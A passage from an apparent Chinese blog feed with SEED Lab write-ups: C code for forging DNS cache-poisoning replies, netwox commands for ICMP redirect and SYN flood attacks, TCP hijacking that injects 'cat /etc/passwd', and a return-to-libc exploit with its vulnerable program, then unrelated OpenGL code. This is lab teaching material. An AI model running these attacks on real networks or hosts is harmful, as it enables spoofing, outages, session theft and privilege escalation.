end-&gt;class=htons(1); //回复的内容 char *ans=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length); strcpy(ans,request_url); int anslength= strlen(ans)+1; struct ansEnd * ansend=(struct ansEnd *)(ans+anslength); ansend-&gt;type = htons(1); ansend-&gt;class=htons(1); ansend-&gt;ttl_l=htons(0x00); ansend-&gt;ttl_h=htons(0xFFFF); //tll,即有效的时间 ansend-&gt;datalen=htons(4); //回复的内容的长度 char *ansaddr=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength); strcpy(ansaddr,"\1\2\3\4"); int addrlen = strlen(ansaddr);//ns域名服务器 char *ns =(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen); strcpy(ns,"\7example\3com"); int nslength= strlen(ns)+1; struct nsEnd * nsend=(struct nsEnd *)(ns+nslength); nsend-&gt;type=htons(2); nsend-&gt;class=htons(1); nsend-&gt;ttl_l=htons(0x00); nsend-&gt;ttl_h=htons(0xFFFF); //tll,即有效的时间 //数据的长度，为nsname的长度+1 nsend-&gt;datalen=htons(23); char *nsname=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength); //伪造的域名服务器 strcpy(nsname,"\2ns\16dnslabattacker\3net"); int nsnamelen = strlen(nsname)+1;//额外的信息 char *ar=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength+nsnamelen); strcpy(ar,"\2ns\16dnslabattacker\3net"); int arlength = strlen(ar)+1; struct ansEnd* arend = (struct ansEnd*)(ar + arlength); arend-&gt;type = htons(1); arend-&gt;class=htons(1); arend-&gt;ttl_l=htons(0x00); arend-&gt;ttl_h=htons(0xFFFF); arend-&gt;datalen=htons(4); char *araddr=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength+nsnamelen+arlength+sizeof(struct ansEnd)); strcpy(araddr,"\1\2\3\4"); int araddrlen = strlen(araddr);/////////////////////dns包的构造到此完毕/////////////////////////////// //构造ip包 struct sockaddr_in sin, din; int one = 1; const int *val = &amp;one; sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);if(sd&lt;0 ) printf("socket error\n"); sin.sin_family = AF_INET; din.sin_family = AF_INET; //端口号 sin.sin_port = htons(33333); din.sin_port = htons(53); //IP地址 sin.sin_addr.s_addr = inet_addr(src_addr); din.sin_addr.s_addr = inet_addr("199.43.133.53"); //example.com的域名服务器的地址，可通过抓包获得 ip-&gt;iph_ihl = 5; ip-&gt;iph_ver = 4; ip-&gt;iph_tos = 0; unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+anslength+sizeof( struct ansEnd)+nslength+sizeof(struct nsEnd)+addrlen+nsnamelen+arlength+sizeof(struct ansEnd)+araddrlen); // length + dataEnd_size == UDP_payload_size ip-&gt;iph_len=htons(packetLength); ip-&gt;iph_ident = htons(rand()); ip-&gt;iph_ttl = 110; ip-&gt;iph_protocol = 17; // UDP //该地值需要抓包确定 ip-&gt;iph_sourceip = inet_addr("199.43.133.53"); // The destination IP address ip-&gt;iph_destip = inet_addr(src_addr); // Fabricate the UDP header. Source port number, redundant udp-&gt;udph_srcport = htons(53); // source port number, I make them random... remember the lower number may be reserved // Destination port number udp-&gt;udph_destport = htons(33333); udp-&gt;udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+anslength+sizeof( struct ansEnd)+nslength+sizeof(struct nsEnd)+addrlen+nsnamelen+arlength+sizeof(struct ansEnd)+araddrlen); // udp_header_size + udp_payload_size // Calculate the checksum for integrity// ip-&gt;iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader)); udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // Inform the kernel do not fill up the packet structure. we will build our own... if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))&lt;0 )&#123; printf("error\n"); exit(-1);&#125;int count = 0;int trans_id = 3000;while(count &lt; 100)&#123; // This is to generate different query in xxxxx.example.edu/* int charnumber; charnumber=1+rand()%5; *(data+charnumber)+=1;*/ //dns-&gt;query_id=rand(); dns-&gt;query_id=trans_id+count; udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet // send the packet out. if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&amp;sin, sizeof(sin)) &lt; 0) printf("packet send error %d which means %s\n",errno,strerror(errno)); count++; &#125;close(sd);return 0;&#125; int main(int argc, char *argv[])&#123;// This is to check the argc number if(argc != 3)&#123; printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP dest_IP \n"); exit(-1); &#125;// socket descriptor int sd;// buffer to hold the packet char buffer[PCKT_LEN];// set the buffer to 0 for all bytes memset(buffer, 0, PCKT_LEN); // Our own headers' structures struct ipheader *ip = (struct ipheader *) buffer; struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader)); struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));// data is the pointer points to the first byte of the dns payload char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));////////////////////////////////////////////////////////////////////////// dns fields(UDP payload field)// relate to the lab, you can change them. begin://////////////////////////////////////////////////////////////////////////The flag you need to set dns-&gt;flags=htons(FLAG_Q);//only 1 query, so the count should be one. dns-&gt;QDCOUNT=htons(1);//query string strcpy(data,"\5abcde\7example\3com"); int length= strlen(data)+1;//this is for convinience to get the struct type write the 4bytes in a more organized way. struct dataEnd * end=(struct dataEnd *)(data+length); end-&gt;type=htons(1); end-&gt;class=htons(1);///////////////////////////////////////////////////////////////////////// DNS format, relate to the lab, you need to change them, end/////////////////////////////////////////////////////////////////////////*************************************************************************************Construction of the packet is done. now focus on how to do the settings and send the packet we have composed out***************************************************************************************/ // Source and destination addresses: IP and port struct sockaddr_in sin, din; int one = 1; const int *val = &amp;one; dns-&gt;query_id=rand(); // transaction ID for the query packet, use random # // Create a raw socket with UDP protocol sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);if(sd&lt;0 ) // if socket fails to be created printf("socket error\n"); // The source is redundant, may be used later if needed // The address family sin.sin_family = AF_INET; din.sin_family = AF_INET; // Port numbers sin.sin_port = htons(33333); din.sin_port = htons(53); // IP addresses sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program // Fabricate the IP header or we can use the // standard header structures but assign our own values. ip-&gt;iph_ihl = 5; ip-&gt;iph_ver = 4; ip-&gt;iph_tos = 0; // Low delay unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size ip-&gt;iph_len=htons(packetLength); ip-&gt;iph_ident = htons(rand()); // we give a random number for the identification# ip-&gt;iph_ttl = 110; // hops ip-&gt;iph_protocol = 17; // UDP // Source IP address, can use spoofed address here!!! ip-&gt;iph_sourceip = inet_addr(argv[1]); // The destination IP address ip-&gt;iph_destip = inet_addr(argv[2]); // Fabricate the UDP header. Source port number, redundant udp-&gt;udph_srcport = htons(33333); // source port number, I make them random... remember the lower number may be reserved // Destination port number udp-&gt;udph_destport = htons(53); udp-&gt;udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size // Calculate the checksum for integrity// ip-&gt;iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader)); udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));/*******************************************************************************8Tipsthe checksum is quite important to pass the checking integrity. You need to study the algorithem and what part should be taken into the calculation.!!!!!If you change anything related to the calculation of the checksum, you need to re-calculate it or the packet will be dropped.!!!!!Here things became easier since I wrote the checksum function for you. You don't needto spend your time writing the right checksum function.Just for knowledge purpose,remember the seconed parameterfor UDP checksum:ipheader_size + udpheader_size + udpData_size for IP checksum: ipheader_size + udpheader_size*********************************************************************************/ // Inform the kernel do not fill up the packet structure. we will build our own... if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))&lt;0 )&#123; printf("error\n"); exit(-1);&#125;while(1)&#123; // This is to generate different query in xxxxx.example.edu int charnumber; charnumber=1+rand()%5; *(data+charnumber)+=1; udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet // send the packet out. if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&amp;sin, sizeof(sin)) &lt; 0) printf("packet send error %d which means %s\n",errno,strerror(errno)); sleep(0.9); response(data, argv[2], argv[1]); &#125;close(sd);return 0;&#125; 在Attacker机器中构造查询信息，随机生成xxxx.example.com的域名，其中xxxx是随机生成的，该目的就是生成不存在的域名，然后while循环，向域名服务器发送查询xxxx.example.com域名的请求，紧接着发送伪造的回复的包。 sudo rndc dumpdb -cache之后查看/etc/bind/dump.db文件的结果如下： 实验二：结果的确认使用假域名 配置攻击者机器为dns服务器，配置过程和上一个dns服务器过程一致。 在Apollo服务器上配置ns.dnslabattacker.net的解析。 具体配置如下：首先在/etc/bind/name.conf.default-zones中配置zone信息： 1234zone “ns.dnslabattacker.net”&#123; type master: file “/etc/bind/db.attacker”;&#125;; 表明具体的解析文件在/etc/bind/db.attacker中，该文件具体内容如下： 1234567891011121314;; BIND data file for local loopback interface;$TTL 604800@ IN SOA localhost. root.localhost. ( 2 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL;@ IN NS ns.dnslabattacker.net.@ IN A 192.168.86.138@ IN AAAA ::1 其中192.168.86.138为攻击者机器的地址。给db.attacker文件加权限chmod 644 db.attacker 在攻击者机器上配置example.com域名的解析，首先在/etc/bind/name/conf中添加如下信息： 1234zone “example.com” &#123; type master; file “/etc/bind/example.com.db”;&#125;; 然后再创建/etc/bind/example.com.db文件，内容如下 1234567891011121314$TTL 3D@ IN SOA ns.example.com. admin.example.com. ( 2008111001 8H 2H 4W 1D)@ IN NS ns.dnslabattacker.net.@ IN MX 10 mail.example.com.www IN A 1.2.3.4mail IN A 1.2.3.2*.example.com. IN A 1.2.3.100 给example.com.db文件加权限，chmod 644 example.com.db。 在victim机器中dig www.example.com,结果如下，解析了exmaple.com的ip地址为1.2.3.4，域名服务器为ns.dnslabattacker.net 在victim中ping www.example.com，结果如下：其访问的是1.2.3.4的ip地址。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>seed</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SeedLab:TCP/IP Attack]]></title>
    <url>%2F2017%2F05%2F16%2Ftcp-ip-attack%2F</url>
    <content type="text"><![CDATA[实验环境：该实验环境是在同一个局域网下完成的，完成整个的实验需要三台机器，这三台机器的ip和mac地址如下所示： 机器1： 192.168.47.174 mac: 00:0c:29:08:4f:9c 机器2： 192.168.47.175 mac: 00:0c:29:4c:5e:ff 机器3： 192.168.47.176 mac: 00:0c:29:1c:41:17 这三台机器的默认网关：192.168.47.2 操作系统：ubuntu 12.04 32位 所使用的工具：netwox, hunt, wireshark 实验操作：实验1：ARP缓存中毒ARP协议的主要目的在于简化OSI模型第二层和第三层间地址的翻译。第二层(也就是数据链层)使用MAC地址，以便硬件设备可以在小范围内直接进行通信。第三层(也就是网络层)使用IP地址(最常见的形式)来创建连通世界各地用户的大规模网络。数据链层直接处理连接在一起的设备，而网络层处理那些直接以及间接连接的设备，每一层都有自己的地址形式，他们必须合作才能实现网络通信。正是由于这个原因，ARP与RFC826(以太网地址解析协议)一起被创建。在该实验中，首先有一个机器1在局域网中发送arp包，包的内容为将自己的mac地址与机器2的ip地址相关联，此时，如果机器3想要发送一个包给机器2，就会发不过去。具体操作如下：在机器1中执行如下指令，即向局域网广播00:0c:29:08:4f:9c的mac地址对应的ip地址为192.168.47.175 打开wireshark后可以看到机器1就发送arp的包意思为192.168.47.175在mac地址为00:0c:29:08:4f:9c。 所以在机器3 输入arp -a，结果如下： 即ip地址192.168.47.175对应了机器1的mac地址00:0c:29:08:4f:9c在机器3中输入telnet之后结果如下： 实验2：ICMP重定向攻击 ICMP重定向的攻击是一个比较有效的并且类似于ARP攻击的手段,而且是利用了另外一个正常的协议——ICMP协议，发起的攻击。黑客远程控制目标机器是有些难度的，但如果只是冒充网关，那就非常容易实现了，黑客冒充网关，对目标主机发送ICMP重定向报文，报文里的路由IP填成一个虚假的、不存在或网络不通的地址，这样，目标主机收到ICMP重定向报文后，就会对路由表进行添加、修改（前提是ICMP重定向功能是开启的），将黑客指定的目标与目标间通信的网关地址设置成那个虚假的IP地址，这样，就实现了利用ICMP重定向的攻击。 攻击者：机器1 受害者：机器2 在机器1上运行sudo traceroute 119.75.218.70(百度的ip) 可知第一个route为192.168.47.2即默认网关的地址。 Wireshark抓包如图所示： 现在机器1以默认网关的名义向机器3发送IMCP重定位信息，通知机器3，默认路由的地址已经改为Machine 1（192.168.47.174）。同时为了机器1能够转发数据包，需要对机器1进行转发数据包的设置，可用下面的命令实现： sysctl net.ipv4.ip_forward=1 进行攻击的命令: netwox 86 -d &quot;Eth0&quot; --gw &quot;192.168.47.174&quot; -i &quot;192.168.47.2&quot; 结果如下图所示： 则机器3在traceroute 百度的时候，会首先经过机器1 用WireShark抓包的结果如下： 实验3：SYN 泛洪攻击通常一次TCP连接建立需要三个步骤，第一客户端发送SYN包给服务端，第二服务器分配一定资源给这个连接并返回SYN/ACK包，然后等待连接就建立的最后的ACK包，第三最后客户端发送ACK报文。这样两者之间的连接就建立起来了，可以通过连接传输数据。攻击的过程就是疯狂 发送SYN报文，而不返回ACK报文。服务器占用过多资源，导致系统资源占用过多，没有能力响应别的操作或正常的网络请求。用自己很少的资源占用对方大量的资源，以小博大。 将机器3作为telnet服务器，机器1通过telnet来登陆机器3： 在机器3中输入sysctl -a | grep cookie输出如下图： 可以知道该机器打开了syn cookie，现将其关闭：sysctl -w net.ipv4.tcp_syncookies=0现在对Machine 3的端口23(telnet端口)进行洪泛攻击： netwox 76 -i &quot;192.168.47.176&quot; -p &quot;23&quot; 此时查看机器3的端口23的待处理队列如下： 由上图可知tcp的23端口被泛洪攻击了。机器2 telnet连接机器3，由下图可知连接不上。 如果打开了syn cookie，则机器2可以telnet连接机器3，如图所示： Syn cookie的原理就是如果短时间内连续收到某个IP的重复SYN请求，则认为受到了该IP的攻击，丢弃来自该IP的后续请求报文。此外合理地采用防火墙等外部网络安全设施也可缓解SYN泛洪攻击。 实验4：对Telnet的TCP RST攻击RST表示复位，用来异常的关闭连接，在TCP的设计中它是不可或缺的。发送RST包关闭连接时，不必等缓冲区的包都发出去（不像上面的FIN包），直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。A和服务器B之间建立了TCP连接，此时C伪造了一个TCP包发给B，使B异常的断开了与A之间的TCP连接，就是RST攻击了。 机器1连接上了机器3的telnet服务器，如图所示： 可知机器1已经telnet上了机器3。 现在在机器2上构造一个 TCP TST包发送给机器3，这样Telnet 客户端就会断开连接： 再次连接也连接不上。 实验5：对视频流应用程序的TCP RST攻击该实验与实验4的原理一致，所以直接展示一下实验结果。 该实验有两个机器，victim的 ip为192.168.47.177Attacker的ip为192.168.47.178 首先victim机器在优酷上看视频： 然后在attacker的机器上发送RST包： 在victim机器上， 可以看出，加载失败，攻击成功。 然后再attacker的机器上停止发送RST包，再刷新victim机器的视频，可以再次播放。 实验6：TCP报文劫持机器 2 (192.168.47.175) Telnet到机器 3(192.168.47.176);在机器 1(192.168.47.174)上劫持机器 2 到机器 3上的Telnet报文。 在机器1上开启hunt工具来嗅探当前网络上的TCP连接 在机器2上通过telnet连接上机器3： 劫持TCP报文，在Machine 1上显示 Machine3上的passwd文件。 选择第0行，然后在向劫持的Telnet报文中注入cat /etc/passwd命令，实现机器 3上的passwd文件。 结果在机器3上显示如下：]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>seed</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[seedLab:returnToLibc]]></title>
    <url>%2F2017%2F05%2F16%2Fseed-returnToLibc%2F</url>
    <content type="text"><![CDATA[声明该教程是根据Seed Lab: return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)一：背景介绍DEP数据执行保护 溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP（数据执行保护，Data Execution Prevention）就是用来弥补计算机对数据和代码混淆这一天然缺陷的。DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP 的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。所以一般的将shellcode存放到栈中并将shellcode执行的方式在这种机制中是不可行的。 在Linux中，通常在编译的时候添加 -fno-stack-protector -z noexecstack 编译选项就会开启该模式，在该模式下，不能像以前的攻击将恶意代码overflow进栈中，并将return地址指向恶意代码开始处，在这种情况下应该借用系统库的调用从而达到提权等目的。 Return-to-libc原理 Return-into-libc 攻击可以将漏洞函数返回到内存空间已有的动态库函数中。而为了理解 return-into-libc 攻击，这里首先给出程序函数调用过程中栈帧的结构。 图 1.函数调用时栈帧的结构： 图 1 给出了一个典型的函数调用时的栈帧结构，该栈从高位地址向低位地址增长。每当一个函数调用另一个函数向低地址方向压栈，而当函数返回时向高地址方向清栈。例如，当 main() 调用 func(arg_1,arg_2,arg_3) 时，首先将所有参数arg_1,arg_2 和 arg_3入栈。图 1 中参数从右向左依次被压入栈中，这是因为 C 语言中函数传参是从右向左压栈的。然后，call 指令会将返回地址压栈，并使执行流转到 func()。返回地址是 call 指令的下一条指令的地址，这个用于告知 func ()函数返回后从 main()函数的哪条指令开始执行。进入 func 函数后，通常需要将 main()函数的栈底指针 ebp 保存到栈中并将当前的栈顶指针 esp 保存在 ebp 中作为 func 的栈底。接下来，func 函数会在栈中为局部变量等分配空间。因此，调用函数 func()时的栈帧结构如图 1 所示。 而当 func()执行完成返回时 leave 指令将 ebp 拷贝到 esp 中清空局部变量在栈中的区域，然后从堆栈中弹出老 ebp 放回 ebp 寄存器使 ebp 恢复为 main()函数的栈底。然后 ret 指令从栈中获取返回地址，返回到 main()函数中继续执行。 攻击者可以利用栈中的内容实施 return-into-libc 攻击。这是因为攻击者能够通过缓冲区溢出改写返回地址为一个库函数的地址，并且将此库函数执行时的参数也重新写入栈中。这样当函数调用时获取的是攻击者设定好的参数值，并且结束后返回时就会返回到库函数而不是 main()。而此库函数实际上就帮助攻击者执行了其恶意行为。更复杂的攻击还可以通过 return-into-libc 的调用链（一系列库函数的连续调用）来完成。 二：实验部分获得system()和exit()的地址由于在实验开始就执行了 sysctl -w kernel.randomize_va_space=0 命令，该命令用来将系统的ASLR（地址随机化机制）关闭，所以在每次将libc.so库加载到内存中时，system()和exit()的地址都是一样的。所以就gdb调试retlib程序，在main出设置断点，并运行，程序会在main的入口处停下，然后执行p system,和p exit就能将system和exit在内存中的地址打印出来。 具体操作如图2所示： 由该图可知，函数system()和exit()的地址分别为0xb7e5f430和0xb7e52fb0。 获得”/bin/sh”字符串地址获得字符串的地址主要有两种方法:其中第一个是在libc.so中找到字符串地址，第二个方法是将/bin/sh字符串放到环境变量中去 由于libc.so的地址是固定的，所以在libc.so的”/bin/sh”字符串的地址也是固定的，所以可以在gdb调试的时候用find指定找到一个/bin/sh字符串的地址，具体方法如图3所示： 首先export MYSHELL = /bin/sh,然后编写程序获得名为MYSHELL环境变量的地址，将其输出即可，输出结果如图4所示： 获得buffer要return的地址偏移首先构造一个从A-Z和从a-z的badfile文件，然后gdb retlib，run，就会出现栈溢出，找出栈溢出的地址为如图5所示 0x62615a59代表的char为baZY，因为它是大端法表示的，所以为YZab，在地buffer的24-27偏移处。所以X为24。 由图1可知道栈的结构，即return地址的下面4个字节为要返回的下个地址指针，再下面4个字节为函数参数，所以24+4=28处存取exit()的函数，24+8=32出存取/bin/sh字符串的地址 编写exploit程序所以exploit.c的程序如下所示: 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char buf[40]; FILE *badfile; badfile = fopen("./badfile", "w"); int i; for(i = 0;i &lt; 40;i++) buf[i] = 0x90; /* You need to decide the addresses and the values for X, Y, Z. The order of the following three statements does not imply the order of X, Y, Z. Actually, we intentionally scrambled the order. */ *(long *) &amp;buf[32] = 0xb7f80fb8 ; // "/bin/sh" *(long *) &amp;buf[24] = 0xb7e5f430 ; // system() *(long *) &amp;buf[28] = 0xb7e52fb0 ; // exit() fwrite(buf, sizeof(buf), 1, badfile); fclose(badfile);&#125; 在前面步骤获得了system()，exit()和/bin/sh在内存的地址，以及return在buffer的偏移地址，所以可以按照上面获得的信息来补全exploit.c的程序。 retlib.c程序: 12345678910111213141516171819202122232425262728/* This program has a buffer overflow vulnerability. *//* Our task is to exploit this vulnerability */#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int bof(FILE *badfile)&#123;char buffer[12];/* The following statement has a buffer overflow problem */fread(buffer, sizeof(char), 40, badfile);return 1;&#125;int main(int argc, char **argv)&#123;FILE *badfile;badfile = fopen("badfile", "r");bof(badfile);printf("Returned Properly\n");fclose(badfile);return 1;&#125; 在编译retlib.c程序时，用root权限编译，这样在运行/bin/sh程序时即可提权。 提权结果如下：]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>反汇编</tag>
        <tag>exploit</tag>
        <tag>seed</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[openGL_Rebort]]></title>
    <url>%2F2017%2F05%2F16%2Fopen-Rebort%2F</url>
    <content type="text"><![CDATA[该项目使用opengl做的一个机器人，能够行走，旋转，并对机器人贴了图。具体源码请参考我的github 实验环境：visual studio 2015 源码解析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560// gl_robot2.cpp : 定义控制台应用程序的入口点。//#define GLUT_DISABLE_ATEXIT_HACK#pragma comment(lib, "legacy_stdio_definitions.lib")#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;gl/glut.h&gt;#include &lt;gl\GLAUX.H&gt;#include &lt;cmath&gt;#define GLOBAL_SIZE 0.5#define PI 3.1415926bool isLeft = true;static const GLfloat leg_x = 2.0, leg_y = 0.6, leg_z = 0.5; //腿的坐标系缩放比例static const GLfloat body_x = 1.2, body_y = 2.4, body_z = 1.8; //身体的坐标系缩放比例static const GLfloat head_x = 1.0, head_z = 1.2, head_y = 1; //头的半径static const GLfloat arm_x = 1.6, arm_y = 0.6, arm_z = 0.4; //手臂的坐标系缩放比例static const GLfloat head_radis = 0.25;static const GLfloat foot_x = 1.0, foot_y = 0.3, foot_z = 0.4; //脚的坐标系缩放比例static const GLfloat neck_x = head_x / 2, neck_y = head_y, neck_z = head_z / 4;static GLfloat centerX = 0.0, centerY = 0.0, centerZ = 0.0;static GLint angle = 0;//初始的角度为竖直的static int leftHigherLegAngle = -90, rightHigherLegAngle = -90;static int LeftLowerLegAngle = 90, rightLowerLegAngle = 0;static int leftHigherHandAngle = -90, rightHigherHandAngle = -90;static int leftLowerHandAngle = 0, rightLowerHandAngle = 0;static int leftFootAngle = 0, rightFootAngle = 0;int speed = 1;GLUquadricObj *quadratic; //画三维物体时用到GLuint g_texture = 0, g_texture_head = 0, g_texture_ground = 0, g_texture_sky = 0;void init(void) &#123; glClearColor(0.0, 0.0, 0.0, 0.0); glShadeModel(GL_FLAT); glEnable(GL_DEPTH_TEST); //glCullFace(GL_BACK);//背面裁剪(背面不可见) //glEnable(GL_CULL_FACE);//启用裁剪 glEnable(GL_TEXTURE_2D); quadratic = gluNewQuadric(); gluQuadricNormals(quadratic, GLU_SMOOTH);&#125;//画立方体的函数void drawCube_head(GLfloat x, GLfloat y, GLfloat z)&#123; GLfloat x1 = 0.5 * x / 2; GLfloat y1 = 0.5 * y / 2; GLfloat z1 = 0.5 * z / 2; glBindTexture(GL_TEXTURE_2D, g_texture_head); glBegin(GL_QUADS); //glPushMatrix(); //画前面 glVertex3f(-x1, y1, z1); glVertex3f(x1, y1, z1); glVertex3f(x1, -y1, z1); glVertex3f(-x1, -y1, z1); //画后面 glVertex3f(-x1, y1, -z1); glVertex3f(x1, y1, -z1); glVertex3f(x1, -y1, -z1); glVertex3f(-x1, -y1, -z1); //画上面 glVertex3f(-x1, y1, z1); glVertex3f(x1, y1, z1); glVertex3f(x1, y1, -z1); glVertex3f(-x1, y1, -z1); //画底面 glVertex3f(-x1, -y1, z1); glVertex3f(x1, -y1, z1); glVertex3f(x1, -y1, -z1); glVertex3f(-x1, -y1, -z1); //画左面 glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, y1, z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(-x1, y1, -z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(-x1, -y1, -z1); glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, -y1, z1); //画右面 glVertex3f(x1, y1, z1); glVertex3f(x1, y1, -z1); glVertex3f(x1, -y1, -z1); glVertex3f(x1, -y1, z1); glEnd(); //glPopMatrix();&#125;void drawCube(GLfloat x, GLfloat y, GLfloat z)&#123; GLfloat x1 = 0.5 * x / 2; GLfloat y1 = 0.5 * y / 2; GLfloat z1 = 0.5 * z / 2; glBindTexture(GL_TEXTURE_2D, g_texture); glBegin(GL_QUADS); //glPushMatrix(); //画前面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, y1, z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, -y1, z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, -y1, z1); //画后面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, y1, -z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, y1, -z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, -y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, -y1, -z1); //画上面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, y1, z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, y1, -z1); //画底面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, -y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, -y1, z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, -y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, -y1, -z1); //画左面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(-x1, y1, -z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(-x1, -y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, -y1, z1); //画右面 glTexCoord2f(0.0f, 0.0f); glVertex3f(x1, y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, y1, -z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, -y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(x1, -y1, z1); glEnd(); //glPopMatrix();&#125;int LoadGLTexTures_head(GLuint&amp; unTexture, const char* chFileName)&#123; AUX_RGBImageRec *TextureImage; //保存贴图数据的指针 TextureImage = auxDIBImageLoadA((LPCSTR)"face.bmp"); //TextureImage_head = auxDIBImageLoadA((LPCSTR)"face.bmp"); glGenTextures(1, 